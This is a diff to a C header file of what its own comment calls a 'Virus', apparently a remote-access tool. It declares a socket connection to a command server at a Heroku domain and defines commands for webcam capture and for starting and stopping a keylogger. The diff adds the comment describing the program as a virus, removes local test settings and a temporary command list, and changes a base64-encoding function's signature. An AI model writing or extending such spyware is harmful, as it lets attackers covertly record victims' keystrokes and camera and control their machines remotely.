@@ -20,14 +20,14 @@
 #define SOCKET_PORT 8000
 */
 
+/*
+	The mainly purpose of the Virus is to run with the Heroku server.
+*/
 
 // global variables for the socket connection has made with the heroku server. -> only if running on to server
 extern char SOCKET_IP[16];
 extern int SOCKET_PORT;
 
-// if running locally
-//#define SOCKET_IP "127.0.0.1"
-//#define SOCKET_PORT 8000
 
 #define DOMAIN_NAME "my-server-virus-commander.herokuapp.com"
 
@@ -58,11 +58,6 @@ extern int SOCKET_PORT;
 #define WEB_CAM "WebCam"
 #define START_KEY_LOGGER "StartKeyLogger"
 #define STOP_KEY_LOGGER "StopKeyLogger"
-
-// temp command
-/*"WebCam",
-"StartKeyLogger",
-"StopKeyLogger"*/
 
 
 extern char pc_name[MAX_COMPUTERNAME_LENGTH + 1]; // global variable of the pc-name -> used in many functions.
@@ -122,4 +117,4 @@ char* get_data_from_http_msg(char* server_response, int server_response_len);
 int copy_data(char* destination, char* source, int destination_size);
 
 // This function encodes file to base 64 file.
-int encode_to_base_64(char* file_to_encode, int file_size, char* file_destination, int file_destination_size);
+int encode_to_base_64(unsigned char* file_to_encode, int file_size, unsigned char* file_destination, int file_destination_size);
